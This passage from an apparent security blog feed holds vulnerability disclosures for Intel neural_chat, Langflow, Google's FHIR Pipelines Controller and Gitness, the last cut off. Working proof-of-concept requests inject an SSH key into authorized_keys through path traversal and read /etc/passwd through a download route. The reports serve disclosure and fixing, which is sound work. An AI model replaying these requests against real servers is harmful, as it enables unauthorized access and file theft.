cat: /home/kali/.ssh/authorized_keys: No such file or directory
</code></pre></div></div>

<p>An attacker can now send the following request to the webserver. This request will upload the attackerâ€™s public RSA key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file.</p>

<p>We start a default neural_chat server following tutorial from <a href="https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation">https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation</a>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Install system requirements
sudo apt-get update
sudo apt-get install -y python3-pip
sudo apt-get install -y libgl1-mesa-glx

# clone the project
git clone https://github.com/intel/intel-extension-for-transformers.git
cd intel-extension-for-transformers/intel_extension_for_transformers/neural_chat/

# Install python requirements
pip install -r requirements_cpu.txt
pip install fastapi==0.103.2
pip install intel-extension-for-transformers
</code></pre></div></div>

<p>Start neural_chat server, the service is open at <code class="language-plaintext highlighter-rouge">0.0.0.0:8000</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># start neural_chat server, it will download model from internet for first time, be patient.
neuralchat_server start --config_file ./server/config/neuralchat.yaml
</code></pre></div></div>

<p>Send follow post request to the server using burpsuite:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://10.15.0.5:8000/v1/askdoc/upload_files HTTP/1.1
Host: 10.15.0.5:8000
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvIlRA9q70krSRDb7
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
Cookie: 
Connection: close
Content-Length: 409

------WebKitFormBoundaryvIlRA9q70krSRDb7
Content-Disposition: form-data; name="knowledge_base_id"

123
------WebKitFormBoundaryvIlRA9q70krSRDb7
Content-Disposition: form-data; name="files"; filename="blob"
Content-Type: text/plain

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
------WebKitFormBoundaryvIlRA9q70krSRDb7
Content-Disposition: form-data; name="file_paths"

/home/kali/.ssh/authorized_keys
------WebKitFormBoundaryvIlRA9q70krSRDb7--
</code></pre></div></div>

<p>The response indicates error but the file is written successfully.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Content-Length: 39
Connection: keep-alive
Content-Type: application/json
Date: Mon, 27 May 2024 07:41:53 GMT
Keep-Alive: timeout=4
Proxy-Connection: keep-alive
Server: uvicorn

"Error occurred while uploading files."
</code></pre></div></div>

<p>We can verify the success by again checking the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
</code></pre></div></div>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>

<h3 id="ssh-access">SSH Access</h3>

<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>

<h3 id="web-servers">Web Servers</h3>

<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>

<h2 id="reference">Reference</h2>

<p><a href="https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e">https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e</a></p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319">https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release</title><link href="http://0.0.0.0:4000/file-overwrite/2024/05/26/remote-code-execution-using-path-traversal-in-langflow.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release" /><published>2024-05-26T10:31:06+08:00</published><updated>2024-05-26T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/05/26/remote-code-execution-using-path-traversal-in-langflow</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/05/26/remote-code-execution-using-path-traversal-in-langflow.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in Langflow Pre-release.</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="version">Version</h2>

<blockquote>
  <p>Pre-release version: 1.0 Alpha - v1.0.0a37</p>
</blockquote>

<h2 id="description">Description</h2>

<p>The post <code class="language-plaintext highlighter-rouge">/upload/{flow_id}</code> endpoint in the Langflow <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47">upload_file</a> is vulnerable to a path traversal vulnerability through the <code class="language-plaintext highlighter-rouge">filename</code> parameter which allows the uploading of arbitrary files. The <code class="language-plaintext highlighter-rouge">filename</code> is then directly append to a directory path <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34">without sanitized</a> and the file content is writen to dest location. An attacker can upload and overwrite ANY file on the filesystem. This can lead to remote code execution in many different ways.</p>

<p>The vulnerable function <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34"><code class="language-plaintext highlighter-rouge">save_file</code></a>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>async def save_file(self, flow_id: str, file_name: str, data: bytes):
        folder_path = self.data_dir / flow_id
        folder_path.mkdir(parents=True, exist_ok=True)
        file_path = folder_path / file_name

        try:
            with open(file_path, "wb") as f:
                f.write(data)
            logger.info(f"File {file_name} saved successfully in flow {flow_id}.")
        except Exception as e:
            logger.error(f"Error saving file {file_name} in flow {flow_id}: {e}")
            raise e
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>In this proof of concept, we will be gaining remote code execution by uploading our SSH key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file. There are many other ways to achieve remote code execution via a file upload, such as overwriting binaries, writing to .bashrc, â€¦.</p>

<p>We proof this vulnerability by logging into the <code class="language-plaintext highlighter-rouge">kali</code> user running the langflow python API and checking that at this moment the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file does not exist.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
cat: /home/kali/.ssh/authorized_keys: No such file or directory
</code></pre></div></div>

<p>An attacker can now send the following request to the webserver. This request will upload the attackerâ€™s public RSA key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file.</p>

<p>We start a simple server using tutorial from <a href="https://github.com/langflow-ai/langflow?tab=readme-ov-file#-installation">https://github.com/langflow-ai/langflow?tab=readme-ov-file#-installation</a>. Note that we use pre-release versoin:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Install the pre-release version
python -m pip install langflow --pre --force-reinstall
</code></pre></div></div>
<p>Start web interface, the default port is <code class="language-plaintext highlighter-rouge">7860</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -m langflow run
</code></pre></div></div>

<p>Then open the Langflow web interface in browser, create a new project and in the project add a file component, click the file upload button, select random text file with burpsuite intercepting the upload request. We can see the file name and file content in the multipart request body.</p>

<p><img src="/assets/images/bughunter/langflow/file-component.png" alt="file-component" /></p>

<p><img src="/assets/images/bughunter/langflow/file-upload.png" alt="file-upload" /></p>

<p>Change the multipart <code class="language-plaintext highlighter-rouge">filename</code> to <code class="language-plaintext highlighter-rouge">../../../../../../../../../home/kali/.ssh/authorized_keys</code> and file content to our <code class="language-plaintext highlighter-rouge">authorized_keys</code> content. Repeat the upload request.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:7860/api/v1/files/upload/7e774022-0991-47f7-83a1-ef127d439755 HTTP/1.1
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjODFiMWM1Yy1lYzgxLTRkZmQtOGFiZS0yMGIxNDBmOWY3NjkiLCJleHAiOjE3NDgyMjk3NDJ9.PrPNZGIOgBql3mDBTWqmdpg4G1zYeaB-087GH5NHvYE
Cache-Control: no-cache
Connection: close
Cookie: access_token_lf=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjODFiMWM1Yy1lYzgxLTRkZmQtOGFiZS0yMGIxNDBmOWY3NjkiLCJleHAiOjE3NDgyMjk3NDJ9.PrPNZGIOgBql3mDBTWqmdpg4G1zYeaB-087GH5NHvYE
Origin: http://127.0.0.1:7860
Pragma: no-cache
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Host: 127.0.0.1:7860
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=--------------------------636165805457578805665550
Content-Length: 647

----------------------------636165805457578805665550
Content-Disposition: form-data; name="file"; filename="../../../../../home/kali/.ssh/authorized_keys"
Content-Type: application/octet-stream

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
----------------------------636165805457578805665550--
</code></pre></div></div>

<p>The response indicates success with the uploaded file path.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 201 Created
Connection: close
Content-Length: 146
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: http://127.0.0.1:7860
Content-Type: application/json
Date: Sun, 26 May 2024 03:48:37 GMT
Server: uvicorn
Vary: Origin

{"flowId":"7e774022-0991-47f7-83a1-ef127d439755","file_path":"7e774022-0991-47f7-83a1-ef127d439755/../../../../../home/kali/.ssh/authorized_keys"}
</code></pre></div></div>

<p>We can verify the success by again checking the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
</code></pre></div></div>

<h2 id="fix">Fix</h2>

<p>Use <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47">UUID instead of origin file name to store the file</a>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@router.post("/upload/{flow_id}", status_code=HTTPStatus.CREATED)
async def upload_file(
    file: UploadFile,
    flow_id: UUID = Depends(get_flow_id),
    storage_service: StorageService = Depends(get_storage_service),
):
    try:
        flow_id_str = str(flow_id)
        file_content = await file.read()
        # fix the path travesal problem
        file_name = hashlib.sha256(file_content).hexdigest()
        folder = flow_id_str
        await storage_service.save_file(flow_id=folder, file_name=file_name, data=file_content)
        return UploadFileResponse(flowId=flow_id_str, file_path=f"{folder}/{file_name}")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
</code></pre></div></div>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>

<h3 id="ssh-access">SSH Access</h3>

<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>

<h3 id="web-servers">Web Servers</h3>

<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>

<h3 id="any-bounty">Any bounty</h3>

<p>Can I ask for a bug bounty award or a CVE id for this bug? Thank you very much!</p>

<h2 id="reference">Reference</h2>

<p><a href="https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e">https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e</a></p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47">https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47</a></p>

<p><a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34">https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Google: Local File Inclusion in FHIR Pipelines Controller</title><link href="http://0.0.0.0:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control.html" rel="alternate" type="text/html" title="Google: Local File Inclusion in FHIR Pipelines Controller" /><published>2024-05-16T10:31:06+08:00</published><updated>2024-05-16T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control</id><content type="html" xml:base="http://0.0.0.0:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Local File Inclusion in FHIR Pipelines Controller</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="description">Description</h2>

<p>A local file inclusion is present in the FHIR Pipelines Controller when fetching error log file under the <code class="language-plaintext highlighter-rouge">/download?path=</code> route.</p>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>The <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115">route</a> <code class="language-plaintext highlighter-rouge">/download</code> is used for fetching error log if <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/resources/templates/index.html#L241">pipeline run failed</a>. However, the <code class="language-plaintext highlighter-rouge">path</code> parameter is not limited to <code class="language-plaintext highlighter-rouge">dwhRoot</code> folder causing any file on the filesystem can be read.</p>

<p>The <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115">spring boot rest controller</a> to download the log file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@GetMapping(
      value = "/download",
      produces = {MediaType.TEXT_PLAIN_VALUE})
public ResponseEntity&lt;InputStreamResource&gt; download(@RequestParam(name = "path") String path)
      throws IOException {
    ResourceId resourceId = FileSystems.matchNewResource(path, false);
    ReadableByteChannel channel = FileSystems.open(resourceId);
    InputStream stream = Channels.newInputStream(channel);
    InputStreamResource inputStreamResource = new InputStreamResource(stream);
    MultiValueMap&lt;String, String&gt; headers = new HttpHeaders();
    headers.put("Content-type", Arrays.asList(MediaType.TEXT_PLAIN_VALUE));
    return new ResponseEntity&lt;&gt;(inputStreamResource, headers, HttpStatus.OK);
}
</code></pre></div></div>

<p>The <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/resources/templates/index.html#L241">frontend view</a> to fetch log file:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;div th:unless="${#strings.isEmpty(lastRunDetails.logFilePath)}"&gt;
    Last run failed! Please find error logs here
    &lt;button type="submit"
            class="button btn btn-primary" th:onclick="openLogs([[${lastRunDetails.logFilePath}]])"&gt;
        View Raw Logs
    &lt;/button&gt;
&lt;/div&gt;
</code></pre></div></div>
<p>The <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/resources/templates/index.html#L18">javascript function openLogs</a> to fetch the file:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function openLogs(logPath) {
    const url = "/download?path="+logPath;
    // Encode the special characters in the url
    const encodedURL = encodeURI(url);
    window.open(encodedURL, '_blank').focus();
}
</code></pre></div></div>

<p>The <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/PipelineManager.java#L757">log file path</a> <code class="language-plaintext highlighter-rouge">logFilePath</code> is supposed to <code class="language-plaintext highlighter-rouge">dwhRoot + ERROR_FILE_NAME</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>String fileSeparator = DwhFiles.getFileSeparatorForDwhFiles(dwhRoot);
dwhRoot = dwhRoot.endsWith(fileSeparator) ? dwhRoot : dwhRoot + fileSeparator;
ResourceId errorResource = FileSystems.matchNewResource(dwhRoot + ERROR_FILE_NAME, false);
if (dwhFilesManager.doesFileExist(errorResource)) {
    dwhRunDetails.setLogFilePath(dwhRoot + ERROR_FILE_NAME);
}
</code></pre></div></div>

<h3 id="steps-to-reproduce">Steps to reproduce</h3>

<p>Following the official <a href="https://github.com/google/fhir-data-pipes/wiki/Try-out-the-FHIR-Pipelines-Controller#set-up-the-test-server">tutorial</a> to set up the HAPI FHIR server and the FHIR Pipelines Controller service:</p>

<ol>
  <li>
    <p>Clone the fhir-data-pipes repository.</p>
  </li>
  <li>
    <p>Set up a local HAPI FHIR server using docker:</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> docker network create cloudbuild
 docker-compose  -f ./docker/hapi-compose.yml up  --force-recreate -d
</code></pre></div>    </div>
    <p>The base URL for this server is http://localhost:8098/fhir.</p>
  </li>
  <li>
    <p>Open <a href="https://github.com/google/fhir-data-pipes/blob/master/pipelines/controller/config/application.yaml">pipelines/controller/config/application.yml</a> in a text editor. Change <code class="language-plaintext highlighter-rouge">fhirServerUrl</code> to be:</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> fhirServerUrl: "http://localhost:8091/fhir"
</code></pre></div>    </div>
  </li>
  <li>
    <p>Open <a href="https://github.com/google/fhir-data-pipes/blob/master/pipelines/controller/config/hapi-postgres-config.json">pipelines/controller/config/hapi-postgres-config.json</a>. Change <code class="language-plaintext highlighter-rouge">databaseHostName</code> to be:</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> "databaseHostName" : "localhost"
</code></pre></div>    </div>
  </li>
  <li>
    <p>Build the fhir-data-pipes service. In fhir-data-pipes root directory, run following:</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> cd fhir-data-pipes-master
 mvn install -Dlicense.skip=true
</code></pre></div>    </div>
  </li>
  <li>
    <p>After built successfully, <code class="language-plaintext highlighter-rouge">pipelines/controller/target/controller-bundled.jar</code> is generated. Run the server in <code class="language-plaintext highlighter-rouge">pipelines/controller/</code> directory:</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> cd pipelines/controller/
 java -jar target/controller-bundled.jar
</code></pre></div>    </div>
    <p>After service up, the FHIR Pipelines Controller will listen on <code class="language-plaintext highlighter-rouge">http://0.0.0.0:8080</code>. Open the webpage <code class="language-plaintext highlighter-rouge">http://0.0.0.0:8080</code> in browser, We can see FHIR Pipelines Control Panel. Send following request to <code class="language-plaintext highlighter-rouge">/download</code> route:</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> curl http://10.15.0.5:8080/download?path=/etc/passwd
</code></pre></div>    </div>

    <p>The output is the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file:</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
 sync:x:4:65534:sync:/bin:/bin/sync
 games:x:5:60:games:/usr/games:/usr/sbin/nologin
 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
 mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
 news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
 uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
 proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
 www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
 backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
 list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
 irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
 gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
</code></pre></div>    </div>
  </li>
</ol>

<h2 id="impact">Impact</h2>

<p>Any file on the backend filesystem can be read by an attacker with access to the FHIR Pipelines Controller service.</p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115">https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115</a></p>]]></content><author><name></name></author><category term="file-inclusion" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Store XSS in Gitness markdown comment editor</title><link href="http://0.0.0.0:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer.html" rel="alternate" type="text/html" title="Store XSS in Gitness markdown comment editor" /><published>2024-05-11T10:31:06+08:00</published><updated>2024-05-11T10:31:06+08:00</updated><id>http://0.0.0.0:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Store XSS in Gitness markdown comment editor</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-79: Cross-site Scripting (XSS) - Stored</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (7.3)</p>
</blockquote>

<h2 id="description">Description</h2>

<p>An attacker can send malicous description when creating a pull request, or comment with malicious payload bellow an existing PR. Due to improper using of <a href="https://github.com/uiwjs/react-markdown-preview?tab=readme-ov-file#security">react-markdown-preview component</a>, html tags is not fully sanitized, and can be rendered with xss payload.</p>

<p>In <a href="https://github.com/harness/gitness/blame/e31f33addea310b28a21ad1e05ab661acd163ef8/web/src/components/MarkdownViewer/MarkdownViewer.tsx#L144">MarkdownViewer.tsx rehypeRewrite</a>. The sanitizing is not sufficient, only <code class="language-plaintext highlighter-rouge">a, input, checkbox, link</code> is sanitized, the rest html can be injected arbitrarily.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;MarkdownPreview
    key={flag ? hash : 0}
    source={markdown}
    skipHtml={true}
    warpperElement=data-color-mode
    rehypeRewrite={(node, _index, parent) =&gt; {
        if ((node as unknown as HTMLDivElement).tagName === 'a') {
        if (parent &amp;&amp; /^h(1|2|3|4|5|6)/.test((parent as unknown as HTMLDivElement).tagName)) {
            parent.children = parent.children.slice(1)
        }
        ...
        }
        if (
        (node as unknown as HTMLDivElement).tagName === 'input' &amp;&amp;
        (node as Unknown as Element)?.properties?.type === 'checkbox'
        ) {
        const lineNumber = parent?.position?.start?.line ? parent?.position?.start?.line - 1 : 0
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const element = node as any
        element.properties['data-line-number'] = lineNumber.toString()
        element.properties.disabled = !inDescriptionBox
        }
    }}
    rehypePlugins={[
        [rehypeVideo, { test: /\/(.*)(.mp4|.mov|.webm|.mkv|.flv)$/, details: null }],
        [rehypeExternalLinks, { rel: ['nofollow noreferrer noopener'], target: '_blank' }]
    ]}
/&gt;
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<ol>
  <li>
    <p>Create an gitness server, using following command from official tutorial:</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> docker run -d \
 -p 3000:3000 \
 -v /var/run/docker.sock:/var/run/docker.sock \
 -v /tmp/gitness:/data \
 --name gitness \
 --restart always \
 harness/gitness
</code></pre></div>    </div>
  </li>
  <li>
    <p>Create an empty repository, such as: <code class="language-plaintext highlighter-rouge">xss-test</code></p>

    <p><img src="/assets/images/bughunter/gitness/create-repo.png" alt="repo" /></p>
  </li>
  <li>
    <p>Open <code class="language-plaintext highlighter-rouge">Branches</code> section, new branch <code class="language-plaintext highlighter-rouge">branch2</code>. After create new branch, checkout to <code class="language-plaintext highlighter-rouge">branch2</code> and create new file <code class="language-plaintext highlighter-rouge">test</code> with any content, and commit the change.</p>

    <p><img src="/assets/images/bughunter/gitness/new-branch.png" alt="branch" /></p>
  </li>
  <li>
